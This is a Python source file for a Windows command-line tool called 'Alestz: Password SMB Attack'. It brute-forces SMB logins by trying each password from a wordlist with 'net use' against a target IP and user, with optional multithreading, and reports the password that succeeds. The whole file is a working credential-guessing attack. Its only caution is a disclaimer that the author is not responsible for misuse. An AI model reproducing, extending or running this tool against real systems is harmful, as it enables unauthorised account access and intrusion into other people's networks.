import os
import re
import socket
import subprocess
import threading
try:
    def pause(msg="Press Enter to continue..."):
        try:
            input(msg)
        except KeyboardInterrupt:
            pass
    if not os.name == 'nt':
        print("\033[91mThis tool is for Windows only.\033[0m")
        pause(msg="Press Enter to exit...")
        os.system("clear")
        exit(1)
    os.system("title Alestz: Password SMB Attack")
    def check_network():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            return False
    def check_ip(ipV4):
        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
        if re.match(pattern, ipV4):
            blocks = ipV4.split('.')
            if all(0 <= int(block) <= 255 for block in blocks):
                return True
        return False
    def cls():
        os.system('cls')
    def menu():
        cls()
        print("╔════════════════════╗")
        print("║  COMMANDS:         ║")
        print("║  1. Attack         ║")
        print("║  2. Info           ║")
        print("║  3. Exit           ║")
        print("╚════════════════════╝")
    def prompt_input(prompt):
        try:
            return input(prompt + " >> ").strip()
        except KeyboardInterrupt:
            print("\n\n\033[91mKeyboard interrupt!\033[0m")
            pause()
            return None
    def attack(user, passwords, ip, found_flag, result_container):
        for passw in passwords:
            if found_flag.is_set():
                return
            passw = passw.strip()
            if passw:
                try:
                    result = subprocess.run(
                        ["net", "use", f"\\\\{ip}", "/user:" + user, passw],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    print(f"\033[93m[Attacking with password]\033[0m: {passw}")
                    if result.returncode == 0:
                        subprocess.run(["net", "use", f"\\\\{ip}", "/d", "/y"], capture_output=True, text=True)
                        result_container.append(passw)
                        found_flag.set()
                        return passw
                except subprocess.TimeoutExpired:
                    print("\033[91mConnection timed out.\033[0m")
                    return
                except subprocess.SubprocessError as e:
                    print(f"\033[91mError during execution: {e}\033[0m")
                    return
                except Exception as e:
                    print(f"\n\033[91mAn error occurred: {e}\033[0m")
                    return
    def main():
        while True:
            menu()
            choice = prompt_input("")
            if choice is None:
                continue
            elif choice == '1':
                cls()
                print("\033[91mNOTE: I'm not responsible for the bad behavior you have caused.\033[0m")
                pause()
                cls()
                user = prompt_input("[TARGET USER]\n")
                if user == "":
                    print("\n\033[91mPlease enter a username!\033[0m")
                    pause()
                    continue
                elif user is None:
                    continue
                wordlist = prompt_input("\n[PASSWORD LIST]\n")
                if wordlist == "":
                    print("\n\033[91mPlease enter a password list!\033[0m")
                    pause()
                    continue
                elif wordlist is None:
                    continue
                ip = prompt_input("\n[TARGET IP]\n")
                if not check_ip(ip):
                    print("\n\033[91mInvalid IP address!\033[0m")
                    pause()
                    continue
                elif ip is None:
                    continue
                multithreaded = prompt_input("\n[Use multithreading? (y/n)]\n")
                if multithreaded == "":
                    print("\n\033[91mPlease enter a choice!\033[0m")
                    pause()
                    continue
                elif multithreaded is None:
                    continue
                if multithreaded.lower() == 'y':
                    num_threads = prompt_input("\n[NUMBER OF THREADS]\n")
                    if num_threads == "":
                        print("\n\033[91mPlease enter a number!\033[0m")
                        pause()
                        continue
                    elif num_threads is None:
                        continue
                    try:
                        num_threads = int(num_threads)
                        if num_threads <= 0:
                            print("\n\033[91mPlease enter a positive integer!\033[0m")
                            pause()
                            continue
                        elif  num_threads > 4:
                            print("\n\033[91mTool supports a maximum of 4 threads\033[0m")
                            pause()
                            continue
                    except ValueError:
                        print("\n\033[91mInvalid number of threads!\033[0m")
                        pause()
                        continue
                    use_multithreading = True
                elif multithreaded.lower() == 'n':
                    use_multithreading = False
                else:
                    print("\n\033[91mInvalid choice!\033[0m")
                    pause()
                    continue
                cls()
                try:
                    with open(wordlist, 'r', encoding='utf-8') as file:
                        passwords = file.readlines()
                except FileNotFoundError:
                    print("\n\033[91mFile does not exist!\033[0m")
                    pause()
                    continue
                result_container = []
                found_flag = threading.Event()
                if use_multithreading:
                    chunk_size = len(passwords) // num_threads
                    chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]
                    threads = []
                    for chunk in chunks:
                        t = threading.Thread(target=lambda chunk=chunk: attack(user, chunk, ip, found_flag, result_container))
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join()
                    if found_flag.is_set():
                        if result_container:
                            print(f"\n\033[92mPassword found\033[0m: {result_container[0]}")
                        else:
                            print("\n\033[91mPassword not found =(\033[0m")
                        pause()
                else:
                    attack(user, passwords, ip, found_flag, result_container)
                    if result_container:
                        print(f"\n\033[92mPassword found\033[0m: {result_container[0]}")
                    else:
                        print("\n\033[91mPassword not found =(\033[0m")
                pause()
            elif choice == '2':
                cls()
                print("\033[92m")
                print(r"                                  _           _                                 ")
                print(r"                            /\   | |         | |                                ")
                print(r"                           /  \  | | ___  ___| |_ ____                          ")
                print(r"                          / /\ \ | |/ _ \/ __| __|_  /                          ")
                print(r"                         / ____ \| |  __/\__ \ |_ / /                           ")
                print(r"                        /_/    \_\_|\___||___/\__/___|                          ")
                print("\033[0m")
                print("╔════════════════════════════════════════════════════════════════════════════════╗")
                print("║                          Alestz: Password SMB ATTACK                           ║")
                print("║                              Author:  MemeCoder                                ║")
                print("║                                 Version: 3.2                                   ║")
                print("╚════════════════════════════════════════════════════════════════════════════════╝")
                print("\033[92mThank you for using my tool!!!\033[0m")
                pause()
            elif choice == '3':
                cls()
                break
            else:
                print("\n\033[91mInvalid choice!\033[0m")
                pause()
    if __name__ == "__main__":
        main()
except Exception as e:
    print(f"\033[91mAn error occurred: {e}\033[0m")
    pause(msg="\033[91mPress Enter to exit...\033[0m")
    exit(1)
